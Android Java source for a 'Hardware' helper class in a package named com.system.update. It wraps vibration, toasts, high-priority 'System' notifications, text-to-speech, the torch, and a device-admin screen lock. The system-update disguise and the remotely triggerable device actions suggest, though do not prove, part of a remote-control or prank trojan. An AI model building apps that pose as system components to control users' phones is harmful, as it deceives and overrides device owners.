package com.system.update;

import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.hardware.camera2.CameraManager;
import android.os.Build;
import android.os.VibrationEffect;
import android.os.Vibrator;
import android.speech.tts.TextToSpeech;
import android.widget.Toast;
import androidx.core.app.NotificationCompat;
import java.util.Locale;

public class Hardware {

    public static void vibrate(Context ctx, long ms) {
        Vibrator v = (Vibrator) ctx.getSystemService(Context.VIBRATOR_SERVICE);
        if (v == null) return;
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            v.vibrate(VibrationEffect.createOneShot(ms, VibrationEffect.DEFAULT_AMPLITUDE));
        } else {
            v.vibrate(ms);
        }
    }

    public static void toast(Context ctx, String msg) {
        if (msg == null) return;
        Toast.makeText(ctx, msg, Toast.LENGTH_LONG).show();
    }

    public static void notification(Context ctx, String title, String msg) {
        if (title == null) title = "System";
        if (msg == null) msg = "";
        NotificationManager nm = (NotificationManager) ctx.getSystemService(Context.NOTIFICATION_SERVICE);
        String chId = "sys_update_ch";
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            nm.createNotificationChannel(new NotificationChannel(chId, "System", NotificationManager.IMPORTANCE_HIGH));
        }
        NotificationCompat.Builder b = new NotificationCompat.Builder(ctx, chId)
                .setSmallIcon(android.R.drawable.ic_dialog_info)
                .setContentTitle(title)
                .setContentText(msg)
                .setPriority(NotificationCompat.PRIORITY_HIGH)
                .setAutoCancel(true);
        nm.notify((int) System.currentTimeMillis(), b.build());
    }

    public static void speak(Context ctx, String text) {
        if (text == null) return;
        TextToSpeech tts = new TextToSpeech(ctx, status -> {
            if (status == TextToSpeech.SUCCESS) {
                // English + Arabic
            }
        });
        tts.setLanguage(Locale.getDefault());
        tts.speak(text, TextToSpeech.QUEUE_FLUSH, null, "sys_tts");
    }

    public static void torch(Context ctx, boolean on) {
        try {
            CameraManager cm = (CameraManager) ctx.getSystemService(Context.CAMERA_SERVICE);
            String camId = cm.getCameraIdList()[0];
            cm.setTorchMode(camId, on);
        } catch (Exception e) {
            // ignore
        }
    }

    public static void lock(Context ctx) {
        DevicePolicyManager dpm = (DevicePolicyManager) ctx.getSystemService(Context.DEVICE_POLICY_SERVICE);
        ComponentName admin = new ComponentName(ctx, DeviceAdminReceiver.class);
        if (dpm != null && dpm.isAdminActive(admin)) {
            dpm.lockNow();
        }
    }
              }
